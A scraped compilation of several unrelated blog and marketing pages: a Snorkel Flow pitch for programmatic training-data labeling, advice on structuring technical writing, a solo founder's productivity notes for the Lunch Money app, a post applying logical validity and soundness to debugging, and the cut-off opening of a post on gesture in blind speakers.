                  <p><img data-src="https://d33wubrfki0l68.cloudfront.net/f63e7bd828cf6019ca0add38ca51ca4050dfeea5/288e4/images/training_data_bottleneck.png" alt="" src="https://d33wubrfki0l68.cloudfront.net/f63e7bd828cf6019ca0add38ca51ca4050dfeea5/288e4/images/training_data_bottleneck.png"></p><p>
                      <b>Today’s ML successes often rest on a hidden cost: massive, hand-labeled training datasets.</b>
                      In the last decade, we’ve seen a tectonic shift in AI and ML towards powerful but data-hungry representation learning models.
                      These models—often deep learning architectures—are not only more powerful at obviating traditionally manual development tasks like feature engineering and bespoke model design, but also have never been more accessible in the open source.
                      However, there’s no such thing as a free lunch: these models are highly complex, with tens to hundreds of millions of parameters, and they require massive labeled training datasets to learn from.
                      And, other than in special scenarios where labels are naturally derivative of existing processes, these training datasets need to be labeled by hand.
                  </p>
                  <p>
                      <b>The hand-labeled training data interface to ML has enabled tremendous progress, but is also ridiculously broken.</b>
                      Consider a simple example: a legal analyst at a bank wants to train a contract classification model, and wants to inject a simple heuristic into the ML model: that if “employment” is in the title, the contract should be labeled as an “Employment contract.”
                      Simple, right?
                      Not so.
                      Theoretically, to communicate this specific feature to a machine learning model via only labeling individual data points could require thousands of examples (roughly, inversely proportional to the sparsity of the feature space).
                      From this perspective, it’s like playing 20 questions rather than just communicating the answer directly—fine if you have a massive question-answer bank, but otherwise wholly impractical.
                  </p>
                  <p>
                      <b>Manually labeling training data is prohibitively expensive–especially when expertise and privacy are required.</b>
                      Building training datasets often requires <a href="http://nytimes.com/2018/11/25/business/china-artificial-intelligence-labeling.html">armies of human labelers</a> at massive cost and time expense.
                      For example, ImageNet—one of the foundational projects behind ML’s current explosive progress—took <a href="https://qz.com/1034972/the-data-that-changed-the-direction-of-ai-research-and-possibly-the-world/">over two years</a> to create.
                      However, labeling cats, dogs, stop signs, and pedestrians is one thing; labeling data like medical images, legal and financial contracts, government documents, user data, and network data requires <b>stringent privacy protections</b> and <b>subject matter expert labelers</b>.
                      This means for sectors like financial services, government, telecommunications, insurance, healthcare, and more, creating training data (and by extension, using ML) is either a hugely expensive on-premise activity—or more often, one that is just not feasible to tackle, let alone practical.
                  </p>
                  <p>
                      <b>Iterative development is not possible with hand-labeled data.</b>
                      From an engineering and data science perspective, manually labeled training data fundamentally breaks the ability to quickly iterate, which is absolutely essential in real world settings where input data, output goals, and annotation schema change all the time.
                      From a business perspective, training data is an expensive asset that can’t be reused across projects, can often depreciate to worthless overnight due to changing conditions or business goals, and that presents growing risks—everything from <a href="https://web.archive.org/web/20200703104247/https://cloud.google.com/ai-platform/data-labeling/docs">COVID-related delays</a> to <a href="https://www.theverge.com/2018/1/12/16882408/google-racist-gorillas-photo-recognition-algorithm-ai">issues of bias</a>.
                  </p>
                  <h2>A New Input Paradigm for ML: Programming with Data</h2>
                  <p>
                      With Snorkel Flow, rather than needing to hand-label any training data, users develop <b>programmatic operators</b> that label, augment, and build training data to drive the ML development process.
                  </p>
                  <p><img data-src="https://d33wubrfki0l68.cloudfront.net/ae088a1fc7f3c6326c2e7285bc2d3c7e88907290/ad302/images/platform-label-v3.png" alt="" src="https://d33wubrfki0l68.cloudfront.net/ae088a1fc7f3c6326c2e7285bc2d3c7e88907290/ad302/images/platform-label-v3.png"></p><p>
                      <b>Programmatically labeling and building training data.</b>
                      With Snorkel Flow, the idea is to instead communicate this domain knowledge directly via a programmatic operator like a <a href="https://papers.nips.cc/paper/6523-data-programming-creating-large-training-sets-quickly">labeling function</a>.
                      For example, our legal analyst could write a labeling function that labels documents as “Employment contracts” if the word “employment” is in the title, and otherwise abstains; or, a range of more complex and powerful labeling functions relying on internal knowlegebases, models, legacy heuristics, and more.
                      This approach of effectively programming ML with data is simple, direct, interpretable, modifiable, and agnostic to the model used (which is especially important given the ongoing Cambrian explosion of powerful new open source model architectures).
                  </p>
                  <p>
                      <b>The directness of rules with the flexibility of ML.</b>
                      Rule-based systems have long been used in industry for certain tasks—as an input, individual rules have the desirable property of being direct and interpretable.
                      However, rules can also be brittle, and lack the robustness, flexibility, and sheer power of ML approaches.
                      With Snorkel Flow, you get the best of both worlds: rules (and other interpretable resources) as inputs, and powerful ML models that generalize beyond these rules as the output.
                  </p>
                  <p><img data-src="https://d33wubrfki0l68.cloudfront.net/8b9653f8e7b7803550e9afd55284d43beb190fbe/e2b34/images/platform-manage-v3.png" alt="" src="https://d33wubrfki0l68.cloudfront.net/8b9653f8e7b7803550e9afd55284d43beb190fbe/e2b34/images/platform-manage-v3.png"></p><p>
                      <b>A more powerful yet weaker supervision.</b>
                      At the same time that this programmatic supervision is advantageous in several transformational ways, it is also messier and raises fundamental new technical challenges.
                      The labeling functions and other programmatic operators that users write will have varying unknown accuracies and expertise areas, will overlap and disagree with each other, and may be correlated in tangled and unknown ways.
                      We focused on the algorithmic and systems solutions to these issues over <a href="https://www.snorkel.ai/technology">four-plus years of research</a>, showing both empirically and theoretically that with the right techniques, these deep technical challenges can be overcome.
                      The result: training data that is as good as or better than hand-labeled data, and immensely more practical to create and maintain.
                  </p>
                  <p>
                      <b>Beyond labeling: data augmentation, slicing, monitoring, and more.</b>
                      In high-performance production ML, training data is about a lot more than labeling.
                      For example, data augmentation is a cornerstone technique wherein transformed copies of data (e.g. rotated or blurred images) are used to expand the sizes of training datasets, and make resulting models more robust.
                      Slicing or structuring training datasets into more or less important and difficult subsets is also a critical part of managing production ML. 
                      Finally, monitoring and adapting not just models but …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>One of today’s best bloggers in the functional programming space is <a href="https://chrispenner.ca/">Chris Penner</a>. Despite this, Chris is criminally underrated—nobody I talk to seems to know of his work. Go check him out as soon as you finish reading this post!</p>
<p>This is reasonably pervasive phenomenon in our subculture; there’s lots of fantastic work being produced, but for one reason or another, it falls between the cracks. I’d propose the biggest obstacle is that most FP writing <em>isn’t optimized to be read.</em></p>
<p>So I’d like to take some time today and talk about common failure modes in technical writing. If you don’t have a checklist you run through before publishing a post, you’ll probably get a lot of benefit from internalizing this advice.</p>
<p>The value? You’ll make it easier for people to understand what you’re trying to tell them. Which is why you’re writing in the first place, right? The good news is that none of this is magic—just some simple guidelines for structuring your content.</p>
<h2 id="the-guiding-principle">The Guiding Principle</h2>
<p>Here’s the biggest thing to keep in mind: your reader doesn’t really care what you have to say. You get maybe four sentences to convince them that your essay is worth their time. If you haven’t made your case by then, you’ve probably lost them to the next tab they binge-opened.</p>
<p>Even after you’ve convinced them that it’s a valuable read, you need to continue assuring them that you’re not wasting their time. If you take too long to get to the point, or if you make the information too hard to find on a quick skim, you’ve lost them again.</p>
<p>As a result, alongside your technical content, you have two primary goals to focus on:</p>
<ul>
<li>Provide strong, concise motivations for everything you want to talk about.</li>
<li>Make it easy to skim.</li>
</ul>
<p>If you can do these two things, you’re already most of the way to better engagement.</p>
<h2 id="writing-strong-motivations">Writing Strong Motivations</h2>
<p>People care about solutions to problems they have, or expect to have one day. They care about other things too, but it’s not really relevant to us today.</p>
<p>With this in mind, you want to tailor your motivations in terms of <em>solutions to problems.</em></p>
<p>Here are some good examples of problems that you’ve probably run into (and links to their solutions for you to read later):</p>
<ul>
<li><a href="https://chrispenner.ca/posts/adjunction-battleship">Ed Kmett writes shitty documentation</a></li>
<li><a href="https://reasonablypolymorphic.com/blog/higher-kinded-data/">I have lots of types that need to evolve at the same time</a></li>
<li><a href="http://thinkingwithtypes.com/">There is no good place to learn type-level programming</a></li>
</ul>
<p>Bad examples of motivating documents are things that assume you care <em>simply because they exist.</em> This is <a href="http://hackage.haskell.org/package/pipes-4.3.9/docs/Pipes-Tutorial.html">pretty</a> <a href="http://yannesposito.com/Scratch/en/blog/Yesod-tutorial-for-newbies/">common</a> of libraries’ tutorials. The same document that convinces you to use a technology should also show you how.</p>
<p>As a more general rule, focusing on <em>why</em> is going to be more valuable than on <em>how.</em></p>
<p>Why should someone care, and why your solution is a good one.</p>
<p>“How” without a “why” suggests a contrived solution to a made-up problem. In other words, it’s easily read as “who cares?”</p>
<h2 id="understanding-how-people-read">Understanding How People Read</h2>
<p>People who spend lots of time reading have good heuristics for skipping lots of text. If you understand these heuristics, you can make it easy for people to find what they’re looking for. And remember: they’re looking for reasons to continue reading.</p>
<p>There are two behaviors here. The first is what I call “skimming for concepts”—which is that people will attempt to determine what text is about at a high-level. They’re looking for <em>what you’re trying to tell them</em>, as opposed to <em>what you’re actually saying.</em></p>
<p>When skimming, people are likely to read only the headings and the first two sentences of a paragraph. If they’re convinced they know what you have to say, they’ll skip to the next paragraph. If several paragraphs in a row don’t seem relevant, they’ll skip to the next heading.</p>
<p>If the next heading also fails to grab their attention, they’ll probably give up.</p>
<p>The solution is to structure your argument as a tree. Headings must provide enough information to let someone know whether or not they care about the following prose.</p>
<p>This also means that the first sentence of each paragraph should be sufficient to understand the rest of the paragraph. The remaining sentences are only allowed to reinforce or give details of the first sentence. One paragraph equals one idea.</p>
<p>Roughly speaking, the hierarchy of your document should look like this:</p>
<ul>
<li>Document
<ul>
<li>Heading
<ul>
<li>First sentence
<ul>
<li>Rest of paragraph</li>
</ul></li>
</ul></li>
</ul></li>
</ul>
<p>Maybe you feel like it’s hard to know how much knowledge to assume your readership knows. Understanding how people read makes this a non-issue. Present as much information as is necessary to understand your point, but make it easy to skip if people already know it. Those who don’t yet know will learn, those who do can skip past, and both camps will appreciate it.</p>
<p>After you’ve convinced your reader that they care what you have to say, they’re more willing to read what you <em>actually have to say.</em> When the reader is ready to dive in, that’s when you can make the finer points of your argument.</p>
<p>It’s unlikely that anyone is going to read every word of your essay. It’s even less likely that they’ll read them all in order.</p>
<h2 id="stumbling-blocks">Stumbling Blocks</h2>
<p>Now that you’ve got people ready to listen to you, it’s important to keep them on the same page as you. You really need to stay on top of anything that might break their focus.</p>
<p>Use short sentences. If it’s too hard to parse, people won’t.</p>
<p>Make sure your spelling and grammar have no egregious problems. You don’t need to have perfect command of the language, but you need to be able to signal that you’re trustworthy-enough to listen to. Don’t underestimate how much credibility you’ll lose from blatantly bad spelling and grammar.</p>
<p>This stuff is relatively common-sense.</p>
<p>What might be less so is that you also need to stay on top of conceptual stumbling blocks. If your argument makes a jump that feels poorly motivated or references something potentially unfamiliar, expect that your reader will experience vertigo.</p>
<p>Most of the ideas we talk about in functional programming <em>are not easy,</em> and it doesn’t do anyone any favors to pretend this isn’t so. Expect that your readers will be pretty similar to you; if you had a problem understanding a piece of your topic, <em>call that out.</em> Point out the obstacle. Point out what they might be thinking, and then very explicitly show them what they should be thinking instead.</p>
<p>For example, if your code sample uses a <a href="https://en.wikipedia.org/wiki/Functional_dependency">functional dependency</a>, it might be worth a short sentence saying “that funny bar thing is a functional dependency.” Give a tiny summary of its purpose, and provide a link for them to learn more if they need to.</p>
<p>Another illustration: if <em>you</em> originally got confused that an “algebra in recursion schemes” is not the same thing as the algebra you learned in high-school, your readers probably will too. The first time you say “algebra” in the new context, say “this is a misleading term. This has nothing to do with solving equations like you did in high-school.”</p>
<p>More important than what you’re saying is what you’re <em>not saying.</em> If you’re giving examples of something that fits a pattern, make sure you give examples of things that <em>do not</em> fit the pattern. A concept that is applicable everywhere is useful nowhere.</p>
<p>Give lots of examples. Nobody I know learns via mathematical statements, nor do they learn via long, wordy, abstract prose. People learn by seeing lots of examples, and being told explicitly how these examples relate to one another. The mathematical statements are only useful <em>after</em> you have the intuition, so save them for an appropriate time.</p>
<h2 id="conclusion">Conclusion</h2>
<p>The takeaway advice from this essay is that <em>if you want lots of readers, you must make it easy for them to read.</em></p>
<p>To that end, pay lots of attention to motivation. Why should people care what you have to say? What value does it give <em>them?</em></p>
<p>Focus your energy on the beginnings—both of the essay as a whole, and of each paragraph. People who are unconvinced by your essay’s value will skim their way through it, and they will do that by reading only the beginnings of things.</p>
<p>Make your information easy to find. Structure your argument in a tree, and make sure it supports random-access. Nobody is going to read the whole thing from start to finish. Instead they’re going to jump around, ignoring the pieces they already know, and looking for the bits they don’t.</p>
<p>Use lots of short paragraphs. A paragraph should correspond to a single idea.</p>
<p>Anticipate which parts of your argument will be difficult for your readers, and be proactive in trying to assuage those difficulties. Give lots of examples of what you’re talking about, and more importantly, what you’re not talking about.</p>
<p>Point out where you went into the weeds while learning this stuff. Steer readers away from common mistakes and misconceptions.</p>
<p>And finally, end on a high note. Leave people with a good feeling, and it will incentivize them to get to the bottom of your next piece. Inspirational calls to action are a good way to go out.</p>
<blockquote>
<p>Tell them what you’re going to tell them. Then tell them. Finally, tell them what you told them.</p>
<p>-Unknown</p>
</blockquote>
<p>Funny and poignant quotes are too.</p>

<p>Hello! 👋 My name is Jen and I’m the founder, engineer, designer and customer support at <a href="https://lunchmoney.app/">Lunch Money</a>, a personal finance and budgeting web app.</p>

<p>In short, I am a company of one. I answer the customer support emails and I code and deploy new features. I also manage the <a href="https://developers.lunchmoney.app/" target="_blank">API docs</a> and <a href="https://support.lunchmoney.app/" target="_blank">knowledge base</a>, poke around the logs when there are issues, write the <a href="https://lunchmoney.app/sample_newsletter" target="_blank">bi-monthly newsletters</a> and I designed the logo!</p>

<p>As the company scales, so too must all aspects of my work which I break down into 4 parts: customer support, engineering, product and marketing.</p>

<p><strong>Finding opportunities for process optimization is honestly one of the more fun parts of running a business</strong>. I greatly attribute these to how I’ve been able to stay both solo &amp; sane up until now, currently with 600+ users and $45,000 ARR. In this post, I’m excited to share some of my most successful strategies along with anecdotes from my experience working on Lunch Money.</p>



<p>In the last 14 days, here’s what I got done across all departments:</p>

<ul>
<li><strong>Product:</strong> Launched an internal beta testers program and two sets of new features to test</li>
<li><strong>Engineering:</strong> Wrapped up a 2-week long refactor of some core components on the client-side</li>
<li><strong>Engineering:</strong> Launched a major feature: advanced transaction filters</li>
<li><strong>Engineering:</strong> Closed 13 tickets related to feature improvements and bug fixes</li>
<li><strong>Marketing:</strong> Sent out a newsletter outlining the latest new features</li>
<li><strong>Marketing:</strong> This blog post</li>
<li><strong>Marketing:</strong> Added new pages to the marketing site (<a href="https://lunchmoney.app/features/rules">Rules</a> and <a href="https://lunchmoney.app/features/collaboration">Collaboration</a>) and updated the icons in <a href="https://lunchmoney.app/features">Features</a></li>
<li><strong>Support:</strong> Received 239 inbound support tickets and sent out 358 emails</li>
</ul>

<p>What makes all this work bearable for me is the fact that there is so much variety (which, of course, is the spice of life!). I love being able to switch between tasks to keep the job interesting and my mind refreshed while still being productive overall.</p>

<p><em>Case in point: I just finished a major refactor and pushed out 2 major features to beta, so writing this blog post right now feels like a vacation for my brain.</em></p>

<p>To state the obvious, I enjoy being hyper-efficient (without burning myself out, of course). Even though I am a single person, I can still automate, optimize and parallelize processes.</p>



<h2 id="implement-safeguards">Implement safeguards</h2>

<p><i>Ah, the blissful beginnings of Lunch Money when I’d push code directly to production several times a day.</i></p>

<p>At 500+ users now, those days are long gone and I’ve since needed to adopt the more boring but responsible approach of implementing safeguards to prevent shipping faulty code.</p>

<p>For one, <b>I’ve been thoroughly reviewing my own code before every change</b>. Every major feature, improvement and bug fix lives in a feature branch that I still, by habit from the corporate days, prepend with <code>jen/</code>. After verifying everything works great locally, I make sure to take a break first, whether that’s working on a completely unrelated task, going for a meal or going to bed. The point of this is to ensure that I’m code reviewing with a clear head.</p>

<p>While adhering to these standards of code reviewing myself may add extra time to my overall process, it potentially saves hours of bug-fixing, answering related support tickets and self-loathing (I’m half-kidding here) down the line if I accidentally ship bad code.</p>

<center><blockquote><p lang="en" dir="ltr">New phase of Lunch Money– no more pushing major features straight to production 🤯😂 <a href="https://t.co/RYsz7BnU3L">https://t.co/RYsz7BnU3L</a></p>— Jen (@lunchbag) <a href="https://twitter.com/lunchbag/status/1256987437600927744?ref_src=twsrc%5Etfw">May 3, 2020</a></blockquote> </center>

<p><b>I also recently implemented an internal beta-testing program open to Lunch Money subscribers.</b> With more users accessing my app on a regular basis, the stakes are higher to ship a version that’s as bug-free as possible.</p>

<p>As an engineering team of one, it’s nearly impossible to always get it right the first time, despite having tests (what if I missed an edge case?) or testing locally extensively (how I think my users will use a feature is not always so).</p>

<p>The beta-testing program has provided some additional benefits. It’s nice to have a cohort of users with whom I can have a more candid conversation about Lunch Money and it’s also a great way to show users that their feedback is valued!</p>

<h2 id="automate-later-than-you-need-to">Automate later than you need to</h2>

<p>While automating tasks can save a lot of time in the long-term, it doesn’t always make sense to automate right off the bat.</p>

<p><img src="https://imgs.xkcd.com/comics/is_it_worth_the_time.png"><span>Obligatory XKCD comic (<a href="https://xkcd.com/1205/" target="_blank">link</a>)</span></p>

<p>Automating too late is not a bad thing. I’ll have done the manual work enough times to understand how to eventually automate the task and what edge cases to look out for. I equate it to doing a job yourself before hiring someone– it’s always better to grok the requirements first to some degree so you can understand how to best utilize who you’ve brought on (and appreciate them more!).</p>

<p>I manually triggered the emails for bi-monthly account summaries for months because I wasn’t confident the sending cadence was reasonable. After observing open rates and collecting user feedback, these are now automated to go out on the 5th &amp; 25th of every month.</p>

<p>Something that I’m glad I didn’t spend the time to automate at all was the referral program. If an existing user refers a new user and the new user subscribes to a plan, then both users will receive credit for 1 month.</p>

<p>In the end, the referral program only brought on 11 extra users. It was not a pain at all to manually process rewards for those who did. If I had spent time conjuring up all the edge cases and automating this process, it would not have been worth the time investment.</p>

<h2 id="keep-low-hanging-fruits-in-the-back-pocket">Keep low-hanging fruits in the back pocket</h2>

<p>In my task management system, I use a tag (🍏) to denote which tasks are low-hanging fruits. For the uninitiated, low-hanging fruits are quick tasks that are easy to knock out, such as one-liners or 5-minute fixes.</p>

<p><img src="https://media.giphy.com/media/YP1Jb0JNc7kqFDbdjm/giphy.gif"></p>

<p>I find that keeping these around and tackling them on days when you feel generally unmotivated can really help raise spirits. Still being able to get something completed and shipped is a great way to get out of a slump.</p>



<h2 id="timing-marketing-pushes">Timing marketing pushes</h2>

<p>At Lunch Money, a big part of the business is using the services of Plaid for bank syncing. Plaid charges on a monthly basis which means that if a user signs up on April 30, connects a bank account immediately and doesn’t end up subscribing at the end of their 14-day trial, they will charge me for this user in both April &amp; May’s invoices.</p>

<p>This realization coupled with my intense aversion to paying more than I need to has shaped a lot of practices at Lunch Money.</p>

<p>For one, the data retention policy used to be 30 days which means if your trial ends and you didn’t put in your billing information, your data will be deleted in 30 days. This certainly guarantees that I’ll be overpaying for churned users and is the reason why the data retention policy has since been revised to 5 days.</p>

<p>In total, a user who does not end up subscribing can spend up to 26 days in the Lunch Money system. This comprises of a 14-day trial, the potential for a 1 week trial extension and a 5 day grace period. Assuming enough users connect their bank accounts, the best way to minimize my costs for churned users is to ensure their lifetimes are within one calendar month.</p>

<p><img src="https://lunchbag.ca/uploads/calendar-1.png"></p>

<p>As a result, I always schedule marketing pushes such as blog posts and product launches in the first few days of the month. When I came to this realization, my next Plaid bill went down for the first time.</p>

<h2 id="merging-marketing-and-engineering-for-a-combo-win">Merging marketing and engineering for a combo win</h2>

<p>Taking this a step further, the perk of having a spike in new users is that their trial periods more-or-less overlap. Usually when a new user signs up, they will poke around the product and maybe send in a bug report, a feature request or another piece of feedback. If I reply and address their feedback by putting in a fix or shipping their requested feature within days, more often than not, they end up converting into a happy customer.</p>

<p>I’ve therefore identified the following cycle to maximize potential conversions from spikes in user signups:</p>

<p><img src="https://lunchbag.ca/uploads/gantt-2.png"></p>

<p>After a marketing push, let’s say a product launch, I will see an immediate increase in signups lasting about 3 days and then slowly trailing off.</p>

<p>Over the next few days, I’ll start hearing from these new users via support tickets. I prioritize responding to them and I get to work. Showing these users that I’m committed to improving Lunch Money based on their feedback is a great and honest sales tactic.</p>

<p>About 3 days before the initial wave of user trials ends, I wrap up my engineering sprint and send out a newsletter detailing the latest features and improvements. This re-enforces to new users that the product is under continuous development.</p>

<p>Finally, I have a drip campaign that automatically notifies users a few days before their trial expires and on the actual date of expiry. This period of time is when I typically see most users convert 🤞.</p>



<p>I used to think that if I were to hire someone, it would first be a customer support agent but I’ve since been moving away from that idea. Users are constantly surprised (in a good way!) when they realize the founder is responding to their bug reports or feature requests directly.</p>

<p><strong>Consistently providing great customer support is a long-term investment for Lunch Money</strong> as it is undoubtedly a great way to turn customers into champions. As I receive and respond to support tickets, I’m also able to identify and overhaul the common sources of trouble for users.</p>

<p>I’ve always believed that customer support would be the most important and the hardest part of the business to scale, especially if I have the goal of staying a company of one.</p>

<p>Corroborating data from <a href="https://emailmeter.com/">EmailMeter</a> and my database, it seems my changes are making a difference. Despite a growing user base, inbound support emails remain fairly steady!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<h2>What it means to be wrong and why it’s bad</h2>
<h3>Logical incorrectness</h3>
<p>It’s generally better to be right than to be wrong. Since there’s more than one way to be wrong, I want to be specific about the type of wrongness I want to address in this post before I move on.</p>
<p>The type of wrongness I’m interested in in this post is logical incorrectness, like two plus two equals five.</p>
<h3>The danger of being wrong</h3>
<p>Being right or wrong isn’t just an academic concern. In programming, being wrong often has concrete negative economic (and other) impacts. Developers who are often wrong will be much less efficient and burn up much more payroll cost and opportunity cost than developers who are wrong less often.</p>
<p>Being wrong is also not something that happens every great once in a while. Most humans are wrong about a whole bunch of stuff, a lot of the time, because that’s just human nature. Even really smart people are wrong about things a very nonzero amount of the time.</p>
<p>So I want to share some things we developers can do in order to be wrong less. But first let me share a concrete example of the kind of mistakenness I’m talking about.</p>
<h2>An example of being wrong</h2>
<h3>Bug: an appointment goes missing</h3>
<p>Let’s say I’m building some scheduling software. One of my users, Rachel, reports to me that yesterday she rescheduled someone’s appointment from July 1st at 10am to July 3rd at 10am. Today, Rachel looked at both the schedule for July 1st and July 3rd and the appointment isn’t present on either day. Apparently there’s a bug that removes appointments from the schedule when you try to reschedule them.</p>
<p>So I start to look at the code and see if I can find any evidence that this buggy behavior is present. Unfortunately, the code is very complicated, and my investigation takes a long time. My investigation lasts an entire day. By the end of the day I’ve made almost no progress toward fixing the bug.</p>
<h3>The bug was not the bug</h3>
<p>Unbeknownst to me, the thing I thought was the bug was not actually the bug. In fact, there was no bug. Between the time Rachel rescheduled the appointment and the time Rachel found the appointment missing, another user, Janice. deleted the appointment. There was in fact no bug at all. I was wrong. I wasted a whole day as a consequence of being wrong.</p>
<h2>How to be less wrong</h2>
<p>We developers can be wrong less of the time by studying <b>epistemology</b>. Epistemology is a branch of philosophy which deals with the acquisition of knowledge. Epistemology tells us how we can know, with certainty, what’s true and what isn’t.</p>
<p>More narrowly, we can study <b>logic</b>. Logic is a branch of philosophy that deals with a formal system of reasoning. One of the central ideas of logic is that of an <b>argument</b>. Arguments are the ideas we’ll be focusing on in this post.</p>
<h2>The definition of a logical argument</h2>
<p>An argument is a group of statements including one or more <b>premises</b> and one and only one <b>conclusion</b>. (I shamelessly stole this definition word-for-word from <a href="http://www.uky.edu/~rosdatte/phi120/lesson1a.htm">this web page</a>.)</p>
<p>Now let’s talk about what a premise is and what a conclusion is. As an aid I’ll share an example of a logical argument, henceforth just referred to as an “argument”.</p>
<h3>Argument example</h3>
<blockquote><p>
All fish live in water.<br>
All sharks are fish.<br>
Therefore, all sharks live in water.
</p></blockquote>
<p>This argument contains two premises. “All fish live in water” is a premise. “All sharks are fish” is also a premise.</p>
<p>This argument’s conclusion is of course “Therefore, all sharks live in water”. If it’s true that all fish live in water and it’s true that all sharks are fish, then it’s of course true that all sharks live in water.</p>
<h2>Validity and soundness</h2>
<p>Not all arguments are good ones. An argument can be <b>valid</b> or <b>invalid</b> and <b>sound</b> or <b>unsound</b>.</p>
<h3>Validity</h3>
<p>An argument is <b>valid</b> if the truth of the argument’s conclusion is logically connected to the argument’s premises. Our above fish/shark argument is a valid argument because, if the argument’s premises are true, its conclusion must necessarily be true. We could make the argument invalid by changing some things.</p>
<blockquote><p>
All fish live in water.<br>
All sharks are fish.<br>
Therefore, all sharks have fins.
</p></blockquote>
<p>This argument isn’t valid because its conclusion doesn’t logically flow from its premises. It happens to be true that all sharks have fins, but that fact isn’t true as a natural consequence of this argument’s premises, so the argument isn’t valid.</p>
<p>Note that validity doesn’t have anything to do with truth. An argument can be valid even if its premises aren’t true.</p>
<blockquote><p>
All turtles are invisible.<br>
Everyone has a turtle in their brain.<br>
Therefore, everyone has an invisible turtle in their brain.
</p></blockquote>
<p>The premises of the above argument aren’t true (at least as far as I know) but the argument is nonetheless valid.</p>
<h3>Soundness</h3>
<p>An argument is <b>sound</b> if the argument is valid and its premises are true. Our first argument (“all fish live in water, all sharks are fish, therefore all sharks live in water”) is sound because the argument is valid and its premises are true. <b>Sound arguments always have true conclusions.</b></p>
<p>Here’s another sound argument.</p>
<blockquote><p>
Every 20th century American president has been male.<br>
Richard Nixon was a 20th century American president.<br>
Richard Nixon was male.
</p></blockquote>
<p>Now comes the fun part, where we apply logical arguments to programming. </p>
<h2>Arguments in programming</h2>
<p>Read the following argument, keeping in mind the definitions of validity and soundness. See if you can tell if the argument is valid or invalid, sound or unsound. (If you don’t want a spoiler, don’t scroll past the argument until you’ve read the full argument.)</p>
<blockquote><p>
The site is unusually slow today.<br>
We performed a large deployment this morning.<br>
The deployment is the cause of the slowness.
</p></blockquote>
<p>This argument is <b>unsound</b>. Even if the premises are true, we can’t know based on the premises that the deployment was the cause of the slowness. How do we know it’s not a coincidence? For all we know, our site got featured on Hacker News and a big traffic spike is the cause of the slowness. Our argument is unsound because its conclusion isn’t necessarily true based on its premises. So, the reason that the argument is unsound is because even though its premises are true, its logic is invalid.</p>
<p>Here’s another example. Instead of just two premises, this argument has three.</p>
<blockquote><p>
Sometimes slowness is caused by code changes.<br>
Sometimes slowness is caused by traffic spikes.<br>
The site is unusually slow today.<br>
The cause of the slowness is either a code change or a traffic spike.
</p></blockquote>
<p>This argument is also unsound. There are more possible reasons for a site to be slow than just a code change or a traffic spike. For example, maybe our DevOps person killed half the servers in the middle of the night last night without our knowing it. So despite true premises, this argument, like the preceding one, is <b>invalid</b>.</p>
<p>Here’s another example.</p>
<blockquote><p>
The code in the most recent deployment introduced a bug.<br>
The only thing that went out in the most recent deployment was Josh’s code.<br>
Josh’s code caused the bug.
</p></blockquote>
<p>As long as this argument’s premises are true, this argument is <b>sound</b>. If we know for sure that the most recent deployment introduced a bug, and we know for sure that the only thing that went out in the most recent deployment was Josh’s code, then it does logically follow that Josh’s code caused the bug.</p>
<p>Here’s a final example. This one is a little more detailed than the previous ones.</p>
<blockquote><p>
At 10:32am, a duplicate $20 charge appeared in the system for patient #5225.<br>
Also at 10:32am, Jason carelessly performed a manual actual action on patient #5225, an action that was related to that patient’s $20 charge.<br>
Jason caused the duplicate charge.
</p></blockquote>
<p>This is another <b>unsound</b> argument. Even though it sounds likely that my action caused the duplicate charge, it’s not logically valid to make that inference based on the premises. The invalidity is perhaps not obvious, but can be made more apparent by asking the question: “Are there any possible circumstances under which Jason’s manual action would NOT have created the duplicate charge?” For example, it’s possible that the card could have accidentally been run twice, and the timing was a coincidence.</p>
<p>I have empirical proof of the invalidity of the above argument because this is a real-life example and, in fact, my action was not the cause of the duplicate charge. Part of what helped me determine this is the following sound argument.</p>
<blockquote><p>
It’s impossible to create a charge without having a patient’s credit card information.<br>
It would have been physically impossible for me to involve the patient’s credit card information when I performed my manual action because we don’t store credit card information in the system.<br>
My action couldn’t have created the duplicate charge.
</p></blockquote>
<p>The preceding sound argument (and remember, sound arguments always have true conclusions) led me to investigate more deeply. What I ultimately discovered was that the patient’s card did in fact get run twice and the timing was just a coincidence. Why wasn’t it obvious from the outset that the patient’s card was run twice? Because we use Authorize.net as a payment gateway, and apparently sometimes the Authorize.net API returns a failure response even when the charge was successfully incurred, so from the perspective of our application there was only one charge that got successfully created, even though in reality there were two.</p>
<h2>Good luck with your arguments</h2>
<p>Next time you’re confronted with a programming mystery, I invite you to frame your mystery in terms of arguments. Write down your premises, and make sure to write down only premises that are true, otherwise your argument will be unsound. Then try to come up with a conclusion and make sure that your conclusion necessarily follows from your premises so that your argument is valid. If your argument is valid and sound, your conclusion will necessarily be true.</p>

I always like pointing out this fact when I teach classes on gesture, because it gives us an an interesting perspective on how we learn and use gestures. Until now I’ve mostly cited <a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fwww.nature.com%2Fnature%2Fjournal%2Fv396%2Fn6708%2Fabs%2F396228a0.html&amp;t=ZjI3ODlkYTk0MjZhMTQ3OTdkZTY3OWE3MjA1YzU0NTI2N2JmYTk3MixqY2RYbFZ2Qw%3D%3D&amp;b=t%3A0DQa0-vgmaHanljYXgHk5w&amp;p=https%3A%2F%2Fwww.superlinguo.com%2Fpost%2F149950073272%2Fblind-people-gesture-and-why-thats-kind-of-a-big&amp;m=0" target="_blank">a 1998 paper from Jana Iverson and Susan Goldin-Meadow</a> that analysed the gestures and speech of young blind people. Not only do blind people gesture, but the frequency and types of gestures they use does not appear to differ greatly from how sighted people gesture. If people learn gesture without ever <i>seeing</i> a gesture (and, most likely, never being shown), then there must be something about learning a language that means you get gestures as a bonus.</p><p>Blind people will even gesture when talking to other blind people, and sighted people will gesture when speaking on the phone - so we know that people don’t <i>only </i>gesture when they speak to someone who can see their gestures. <br></p><p>Earlier this year a new paper came out that adds to this story. Şeyda Özçalışkan, Ché Lucero and Susan Goldin-Meadow looked at the gestures of blind speakers of Turkish and English, to see if the *way* they gestured was different to sighted speakers of those languages. Some of the sighted speakers were blindfolded and others left able to see their conversation partner. <br></p><p>Turkish and English were chosen, because it has already been established that speakers of those languages <a 